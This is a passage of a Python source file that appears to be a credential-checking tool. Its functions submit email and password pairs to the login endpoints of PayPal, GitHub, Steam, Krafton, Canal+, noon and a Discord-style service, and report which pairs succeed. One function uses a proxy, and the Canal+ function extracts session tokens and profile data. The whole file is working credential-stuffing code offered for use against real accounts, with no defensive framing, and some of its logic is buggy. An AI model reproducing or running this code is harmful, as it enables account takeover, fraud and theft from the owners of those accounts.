            'x-super-properties': 'eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiQ2hyb21lIiwiZGV2aWNlIjoiIiwic3lzdGVtX2xvY2FsZSI6ImVuLUdCIiwiYnJvd3Nlcl91c2VyX2FnZW50IjoiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzEwMS4wLjQ5NTEuNDEgU2FmYXJpLzUzNy4zNiBFZGcvMTAxLjAuMTIxMC4zMiIsImJyb3dzZXJfdmVyc2lvbiI6IjEwMS4wLjQ5NTEuNDEiLCJvc192ZXJzaW9uIjoiMTAiLCJyZWZlcnJlciI6Imh0dHBzOi8vYWNjb3VudHMua3JhZnRvbi5jb20vIiwicmVmZXJyaW5nX2RvbWFpbiI6ImFjY291bnRzLmtyYWZ0b24uY29tIiwicmVmZXJyZXJfY3VycmVudCI6Imh0dHBzOi8vYWNjb3VudHMua3JhZnRvbi5jb20vIiwicmVmZXJyaW5nX2RvbWFpbl9jdXJyZW50IjoiYWNjb3VudHMua3JhZnRvbi5jb20iLCJyZWxlYXNlX2NoYW5uZWwiOiJzdGFibGUiLCJjbGllbnRfYnVpbGRfbnVtYmVyIjoxMjY2MTEsImNsaWVudF9ldmVudF9zb3VyY2UiOm51bGx9', }
        data = {
            'captcha_key': 'f5561ba9-8f1e-40ca-9b5b-a0b3f719ef34',
            'gift_code_sku_id': 'null',
            'login': str(email),
            'login_source': 'null',
            'password': str(password),
            'undelete': 'false', }
        req = requests.post(url, headers=headers, data=data).text
        if ("Invalid Form Body") in req:
            return {'status': 'error'}
        else:
            message = {'status': 'Success',
                       'user_or_email': str(email),
                       'password': str(password)}
            return message

    def paypal(email: str, password: str) -> str:
        url = 'https://www.paypal.com/signin'
        headers = {
		'User-Agent': str(generate_user_agent()),
		'Accept': 'application/json',
		'Accept-Encoding': 'gzip, deflate, br',
		'Accept-Language': 'en-US,en;q=0.5',
		'Connection': 'keep-alive',
		'Content-type': 'application/x-www-form-urlencoded',
		'Content-Length': '1089',
		'Host': 'www.paypal.com',
		'X-Requested-With': 'XMLHttpRequest'}

        data = {
		'login_email': str(email),
		'login_password': str(password)}
        res = requests.Session().post(url, headers=headers, json=data).text
        if 'myaccount' in res:
            message = {
                'status': 'Success',
                'email': str(email),
                'password': str(password), }
            return message
        else:
            return {'status': 'error'}

    
    def noon(email: str, password: str) -> str:
    	url = "https://api-app.noon.com/_svc/customer-v1/auth/signin"
    	headers = {
			'Host': 'api-app.noon.com',
			'Cookie': 'missing',
			'Content-Type': 'application/json',
			'X-Experience': 'ecom',
			'X-Locale': 'ar-sa',
			'Accept': 'application/json, text/plain, */*',
			'X-Mp': 'noon',
			'Accept-Language': 'en-us',
			'Cache-Control': 'no-cache',
			'X-Content': 'mobile',
			'Content-Length': '52',
			'User-Agent': 'noon/1000 CFNetwork/1237 Darwin/20.4.0',
			'X-Device-Id': '9149EBD3-33DE-4568-918B-0469ECAA6453',
			'X-Platform': 'ios',
			'X-Build': '1000',
			'Connection': 'close'}
    	data = {"email": str(email), "password": str(password)}
    	try:
    		res = requests.post(url, headers=headers, json=data, timeout=4)
    		if res.status_code == 200:
    		          return {
                'status': 'Success',
                'user_or_email': str(email),
                'password': str(password)}
    		else:
    			 return {'status': 'error'}
    	except:
    		return {'status': 'error'}
		  
		  
    
    def github(email: str, password: str) -> str:
    	url = 'https://github.com/session'
    	req = requests.get(url).text
    	token = req.split('authenticity_token" value="')[1].split('"')[0]
    	timestamp = req.split('timestamp" value="')[1].split('"')[0]
    	timestamp_sec = req.split('timestamp_secret" value="')[1].split('"')[0]
    	headers = {
		'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
		'accept-encoding': 'gzip, deflate, br',
		'accept-language': 'ar,en-US;q=0.9,en;q=0.8',
		'cache-control': 'max-age=0',
		'content-length': '539',
		'content-type': 'application/x-www-form-urlencoded',
		'cookie': '_octo=GH1.1.1602150843.1629997608; _device_id=2cfe8a0e419dfac78cf692e1d4ab314b; has_recent_activity=1; tz=Asia%2FBaghdad; tz=Asia%2FBaghdad; color_mode=%7B%22color_mode%22%3A%22auto%22%2C%22light_theme%22%3A%7B%22name%22%3A%22light%22%2C%22color_mode%22%3A%22light%22%7D%2C%22dark_theme%22%3A%7B%22name%22%3A%22dark%22%2C%22color_mode%22%3A%22dark%22%7D%7D; logged_in=no; _gh_sess=lRR5kFMx%2FlqgPtVpWJ%2BJAplP9pV6kkZOP6b0vx4s2FIuU%2B%2FBG777M9KbIzH%2F0%2Fc5GxssendhoACPBk8kMuvyBcqN23lOyFlZf821%2FrRY%2BlJLiB7cyZ01m6eF8bonJtjf0PW0Zh%2BVY15xCY0uy1I5ib7Sx9191WRaFNawYcqj39B26%2Fewq%2Fnt7kxliFzYVM%2BcCnqx%2BNi3tPcO9bD3lIeL%2FeHW6XeBWZmS8IZxo1bI1nQ6ohoACe5nyc6vuDKH4ABY4Gm6X9T5PdvA3gFrnET%2BDg%3D%3D--Du38ZoVbadjHBMt%2F--9BaWzXXfAtGz5F9V0T4k6A%3D%3D',
		'user-agent': str(generate_user_agent())}
    	data = {
		'commit': 'Sign in',
		'authenticity_token': str(token),
		'login': str(email),
		'password': str(password),
		'trusted_device': '',
		'webauthn-support': 'supported',
		'webauthn-iuvpaa-support': 'unsupported',
		'return_to': 'https://github.com/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F&source=header-home',
		'allow_signup': '',
		'client_id': '',
		'integration': '',
		'required_field_1ffb': '',
		'timestamp': str(timestamp),
		'timestamp_secret':  str(timestamp_sec)}

    	try:
    		res = requests.session().post(url,headers=headers,data=data)
    		if '_octo' in req.cookies:
    		          return  {
                'status': 'Success',
                'user_or_email': str(email),
                'password': str(password)}
			
    		else:
    			return {'status': 'error'}
			 	
    	except:
    		return {'status': 'error'}
    
    
    
    
    def mycanel(email: str, password: str) -> str:
    	url = "https://pass.canalplus.com/api/v1/authn"
    	data = '{\"password\":\"'+str(password)+'\",\"username\":\"'+str(email)+'\",\"options\":{\"warnBeforePasswordExpired\":true,\"multiOptionalFactorEnroll\":true}}'
    	headers = { 
		"Host":"pass.canalplus.com",
		"Accept":"application/json",
		"x-okta-user-agent-extended":"okta-signin-widget-4.5.2",
		"Accept-Encoding":"gzip, deflate, br",
		"Accept-Language":"en",
		"Content-Type":"application/json",
		"Origin":"https://pass.canalplus.com",
		"User-Agent":"Mozilla/5.0 (iPhone; CPU iPhone OS 14_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148",
		"Connection":"keep-alive",
		"Referer":"https://pass.canalplus.com/",
		"Content-Length":"133",}
    	res = requests.post(url,headers=headers,data=data)
    	if "{\"expiresAt\":\"" in res.text:
    		name = res.json()['_embedded']['user']['profile']['firstName']
    		country = res.json()['_embedded']['user']['profile']['timeZone']
    		token = res.json()['sessionToken']
    		id = res.json()['_embedded']['user']['id']
    		link = res.json()['_links']['cancel']['href']
    		return {'status':'Success','name':str(name),'country':str(country),'id':str(id),'token':str(id),'link':str(link)}
    	else:
    		return {'status':'error','message':'bad email or username'}
    
    
    def mycanel_pr(email: str, password:str, proxy:str) -> str:
    	url = "https://pass.canalplus.com/api/v1/authn"
    	data = '{\"password\":\"'+str(password)+'\",\"username\":\"'+str(email)+'\",\"options\":{\"warnBeforePasswordExpired\":true,\"multiOptionalFactorEnroll\":true}}'
    	headers = { 
		"Host":"pass.canalplus.com",
		"Accept":"application/json",
		"x-okta-user-agent-extended":"okta-signin-widget-4.5.2",
		"Accept-Encoding":"gzip, deflate, br",
		"Accept-Language":"en",
		"Content-Type":"application/json",
		"Origin":"https://pass.canalplus.com",
		"User-Agent":"Mozilla/5.0 (iPhone; CPU iPhone OS 14_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148",
		"Connection":"keep-alive",
		"Referer":"https://pass.canalplus.com/",
		"Content-Length":"133",}
    	proxies = {'http':f'https//{proxy}'}
    	res = requests.post(url,headers=headers,data=data,proxies=proxies)
    	if "{\"expiresAt\":\"" in res.text:
    		name = res.json()['_embedded']['user']['profile']['firstName']
    		country = res.json()['_embedded']['user']['profile']['timeZone']
    		token = res.json()['sessionToken']
    		id = res.json()['_embedded']['user']['id']
    		link = res.json()['_links']['cancel']['href']
    		return {'status':'Success','name':str(name),'country':str(country),'id':str(id),'token':str(id),'link':str(link)}
    	else:
    		return {'status':'error','message':'bad email or username'}
    
    
    
    
    def steampowered(email: str, password: str) -> str:
        url = "https://store.steampowered.com/login/dologin/"
        headers = {
            'Accept': '*/*',
            'Accept-Encoding': 'gzip, deflate, br',
            'Accept-Language': 'en-GB,en;q=0.9,en-US;q=0.8',
            'Connection': 'keep-alive',
            'Content-Length': '569',
            'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'Cookie': 'browserid=2612656426703308536; timezoneOffset=7200,0; _ga=GA1.2.2134954254.1650963345; steamCountry=EG%7Cb350758a5fc0e37dac1c21162dddc8b9; sessionidSecureOAuthNonce=8ca57c5ed0ecf4ca97d3de1d; sessionid=cc3dc1fdf55251e70f382c28; _gid=GA1.2.2076872525.1651660576',
            'DNT': '1',
            'Host': 'store.steampowered.com',
            'Origin': 'https://store.steampowered.com',
            'Referer': 'https://store.steampowered.com/oauth/login?response_type=token&state=208010b01d89f4801f27010550943b88&client_id=FC7EA02C',
            'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="101", "Microsoft Edge";v="101"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'Sec-Fetch-Dest': 'empty',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Site': 'same-origin',
            'User-Agent': str(generate_user_agent()),
            'X-Requested-With': 'XMLHttpRequest', }
        data = {
            'donotcache': '1651660632160',
            'password': str(password),
            'username': str(email),
            'twofactorcode': '',
            'emailauth': '',
            'loginfriendlyname': '',
            'captchagid': '-1',
            'captcha_text': '',
            'emailsteamid': '',
            'rsatimestamp': '25224900000',
            'remember_login': 'false',
            'tokentype': '-1', }
        req = requests.post(url, headers=headers, data=data).text
        if ("The account username or password that you have entered is incorrect.") in req:
            return {'status': 'error'}

        else:
            message = {
                'status': 'Success',
                'user_or_email': str(email),
                'password': str(password)}
            return message

    def krfton(email: str, password: str) -> str:
        url = "https://accounts.krafton.com/auth/local"
        headers = {
            'accept': 'application/json, text/plain, */*',
            'accept-encoding': 'gzip, deflate, br',
            'accept-language': 'en-GB,en;q=0.9,en-US;q=0.8',
            'cache-control': 'no-cache',
            'content-length': '56',
            'content-type': 'application/json',
            'cookie': 'bm_sz=F67EA857720929784500B9A3D7AB63AC~YAAQ3eF6XJ/MYoeAAQAAHr+hjg8llf0f3uuXPp+Ux8LmBp8chWH5xzg6IvxPxXpWBfaECN4NwzW0PupDCp4O7iETuJjuhtoxu9ANUItua6ClsChLC7b8L3/eQ2nAoBio6WcG6feArrVwbbINFWHW80pm7hkInkIloOwRH0f6/CWRQl89ygDE6XQ6osdHWfhT3UnXFpVJBjYUY7o2rg0jW1F5cnPg/wyFli2Et9NhNlBeJhHD2sX51MrCMFd4hxWx0n1Rn+tDGXH9dcbwVvFhoynpsCbKXjd5OguTf5h+veDwceKn~3490361~3229241; _icl_current_language=en; _gcl_au=1.1.1511135528.1651660413; sessionId=s%3APzlr3Y2S57S8dCgeiJsQkQGl9s2JUAQd.FqSqwDd4hNfzYV61dPmlMDKy6jQR8CeWcpk01DOPdus; _gid=GA1.2.2130624292.1651660414; tmr_lvid=ea720c75f04b85f5f51e56d437ef578e; tmr_lvidTS=1651660413847; ak_bmsc=09DCE3805E9EA121F5C4B7B9E3911E27~000000000000000000000000000000~YAAQ3eF6XKPMYoeAAQAAr8ihjg/JNdFFqnGmUs7Ej1Qz6kJbWOB6dZe1hgAnY76aeoB3WWs1k/aC53cTUwCT+WH7n4rWrM1IilSyPPlgkcI0ThpS7WiXmApMSkrBVyC5msftRvfpOkx1L5AX+PAztJu2ygpxrmm5w871r9mTGRhzXV3tM4kACe4ZNVTK2Qfq9xmX+TiNR4WxfXJBb0NHQv3RBogVOFy6HLTfrAXFHaEyCj49qrbXanrOF6tlPNKFiju34oQ1Lr8o9ieG8jpuv/SOaxgla3t1KVKppWoD3IpzdIkFNKkt65h//L4o/QdRZ6hcX6CLJ48QApek8SntTJtLfPE7ycLZ+/f521P59Y2zAAMabbDB9AAXUVer/Z23INg/SRzrR+nGQfPOdYG49212G7Jt+ALeIW4xuUOKBWoBhKP2hf0dnLmOPwgm0cxFyR9O852T6TIPjugxDOctF1CYViGL3PEDefLOLVy5sgpoOfb1uzNdMh+FvaQ6OA==; _ym_uid=1651660416633065444; _ym_d=1651660416; _fbp=fb.1.1651660415715.791739767; _ym_isad=2; _ym_visorc=b; XSRF-TOKEN=382s9QNI-wAMptihqSH6taFY4WB1lXyy7Aqg; bm_sv=AC65DBD453D92D5067CC1506DD2635D3~hVB1Ek4onborac8Q+/DxocYyF2UD1o5bu0FJ2HyWR0voY3hwV5l6QBKKAYep4MbsetEiNS1cMk1rxJBPApTcbf7EAnllC9W3hAYRzkGvTmZ4VhN8D9vxyifQHva7yEO3T2q5wc+M3krGpA57aF7avNp0x3Aj866ElADx2S/nGhE=; _ga=GA1.1.1700580824.1651660413; RT="z=1&dm=accounts.krafton.com&si=c203a269-59d5-4cf3-b0b9-7b5618c8a312&ss=l2rfzbzv&sl=1&tt=2ye&rl=1&ld=2yg"; _abck=52691F16D214FA98D5460AD613328CD3~0~YAAQ3eF6XLfMYoeAAQAARD6ijgeyvLEIvYUJehcnbHF6dGTg7OFtdEmMRZynd7XTSkMrOc6/XfMK5wRXMXOurUNBqrXGUZDSCMLNwvC2HMV+4vUmHCRPkDf3PxDxZ0rBAb+/wrJ8gE+OMnFvDJ01fxQ3x0+eZ2WuwSpVnY00e5Lkki8Nd+7wjD1qyUMIp3CZZ/nvrwyIJ0ZgbWuZLhAP1NTp/0uRBeWIteF4RMrX7Bs8tHln6uWIaJ8ZpmBIqugUVWmvpvpOUWRCu5TUQBMS8ARRfLlOjwBGuzjLXSiz8Wr27HN52TEj31xIddVjmlp7svQDYyRIT9ZgsHqIiAh1oHhULb2Wb0AvNUptmdxi8wwCazvsDh8DxFqnL/BExyGwHKKSn2vNN03aAewNo0O+ohkDiqKWKRjdnBY=~-1~1-TmWTfQLUKk-1-10-1000-2~-1; tmr_detect=0%7C1651660445893; tmr_reqNum=7; _gat_gtag_UA_119774708_2=1; _gat_gtag_UA_94069604_1=1; _gat_gtag_UA_125508473_1=1; _ga_C3KQ2K005M=GS1.1.1651660412.1.1.1651660513.0; _dd_s=rum=1&id=3454d416-1764-43f6-aa89-cc7941b1931c&created=1651660412905&expire=1651661417829',
            'dnt': '1',
            'origin': 'https://accounts.krafton.com',
            'pragma': 'no-cache',
            'referer': 'https://accounts.krafton.com/login',
            'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="101", "Microsoft Edge";v="101"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': str(generate_user_agent()),
            'x-xsrf-token': '382s9QNI-wAMptihqSH6taFY4WB1lXyy7Aqg', }
        data = {
            'email': str(email),
            'password': str(password), }
        res = requests.post(url, headers=headers, data=data).text
        if ("error.login-denied") in res:
            return {'status': 'error'}

        else:
            message = {
                'status': 'Success',
                'user_or_email': str(email),
                'password': str(password)}
            return message

# -------------------------[CoDe BY GDØ]------------------------
# -------------------------[CoDe BY GDØ]------------------------
# -------------------------[CoDe BY GDØ]------------------------
